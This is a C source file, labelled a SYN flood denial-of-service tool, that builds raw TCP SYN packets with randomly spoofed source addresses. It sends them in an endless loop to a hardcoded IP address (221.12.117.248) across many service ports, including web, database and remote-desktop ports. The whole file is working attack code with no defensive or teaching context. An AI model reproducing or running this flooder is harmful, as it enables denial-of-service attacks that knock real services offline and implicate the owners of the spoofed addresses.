/*
	Syn Flood DOS with LINUX sockets
*/
#include <stdio.h>
#include <string.h> //memset
#include <sys/socket.h>
#include <stdlib.h> //for exit(0);
#include <errno.h> //For errno - the error number
#include <netinet/tcp.h>   //Provides declarations for tcp header
#include <netinet/ip.h>    //Provides declarations for ip header
#include <arpa/inet.h>
#include <fcntl.h>

struct pseudo_header    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	 
	struct tcphdr tcp;
};
 
unsigned short csum(unsigned short *ptr, int nbytes) {
	register long sum = 0;
	unsigned short oddbyte;
	register short answer;

	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}
 
	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	 
	return(answer);
}

void attack(int fd, char* source_ip, int source_port, char* dest_ip, int dest_port);

int main (void) {
	//Create a raw socket
	int fd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	const int* val = new int(1);
	if (setsockopt (fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(int)) < 0) {
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
	int flags = fcntl(fd, F_GETFL, 0);
	fcntl(fd, F_SETFL, flags | O_NONBLOCK);
	
	#pragma omp parallel
	while(true){
		char source_ip[32], dest_ip[32];
		sprintf(source_ip, "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
		sprintf(dest_ip, "221.12.117.248");
		attack(fd, source_ip, rand()%65536, dest_ip, 80);
		attack(fd, source_ip, rand()%65536, dest_ip, 89);
		attack(fd, source_ip, rand()%65536, dest_ip, 1025);
		attack(fd, source_ip, rand()%65536, dest_ip, 1032);
		attack(fd, source_ip, rand()%65536, dest_ip, 1521);
		attack(fd, source_ip, rand()%65536, dest_ip, 2030);
		attack(fd, source_ip, rand()%65536, dest_ip, 2100);
		attack(fd, source_ip, rand()%65536, dest_ip, 3007);
		attack(fd, source_ip, rand()%65536, dest_ip, 3306);
		attack(fd, source_ip, rand()%65536, dest_ip, 3389);
		attack(fd, source_ip, rand()%65536, dest_ip, 8009);
		attack(fd, source_ip, rand()%65536, dest_ip, 8080);
		attack(fd, source_ip, rand()%65536, dest_ip, 8081);
		attack(fd, source_ip, rand()%65536, dest_ip, 8888);
	}

	return 0;
}

void attack(int fd, char* source_ip, int source_port, char* dest_ip, int dest_port) {
		//Datagram to represent the packet
		char datagram[4096];
		//IP header
		struct iphdr *iph = (struct iphdr *) datagram;
		//TCP header
		struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
		struct sockaddr_in sin;
		struct pseudo_header psh;

		//sockaddr_in is used to create socket on this computer
		//iphdr, tcphdr is data that actually send via the socket

		//source & dest
		sin.sin_family = AF_INET;
		sin.sin_port = htons(source_port);
		sin.sin_addr.s_addr = inet_addr(dest_ip);

		memset(datagram, 0, 4096);
			 
		//Fill in the IP Header
		iph->version = 4;
		iph->ihl = 5;
		iph->tos = 0;	
		iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
		iph->id = htons(rand() % 65536);  //Id of this packet
		iph->frag_off = 0;
		iph->ttl = 255;
		iph->protocol = IPPROTO_TCP;
		iph->check = 0;      //Set to 0 before calculating checksum
		iph->saddr = inet_addr(source_ip);    //Spoof the source ip address
		iph->daddr = inet_addr(dest_ip);
		//checksum
		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	

		//TCP Header
		tcph->source = htons(source_port);
		tcph->dest = htons(dest_port);
		tcph->seq = rand();
		tcph->ack_seq = 0;
		tcph->doff = 5;      /* first and only tcp segment */
		tcph->window = htons(65535);
		tcph->check = 0;
		tcph->urg_ptr = 0;
		tcph->fin = 0;
		tcph->syn = 1;
		tcph->rst = 0;
		tcph->psh = 0;
		tcph->ack = 0;
		tcph->urg = 0;

		//Now the IP checksum
		psh.source_address = inet_addr(source_ip);
		psh.dest_address = inet_addr(dest_ip);
		psh.placeholder = 0;
		psh.protocol = IPPROTO_TCP;
		psh.tcp_length = htons(20);
		memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

		tcph->check = csum( (unsigned short*) &psh , sizeof(struct pseudo_header));
		
		sendto(fd, datagram, iph->tot_len, MSG_DONTWAIT, (struct sockaddr *) &sin, sizeof(struct sockaddr_in));
}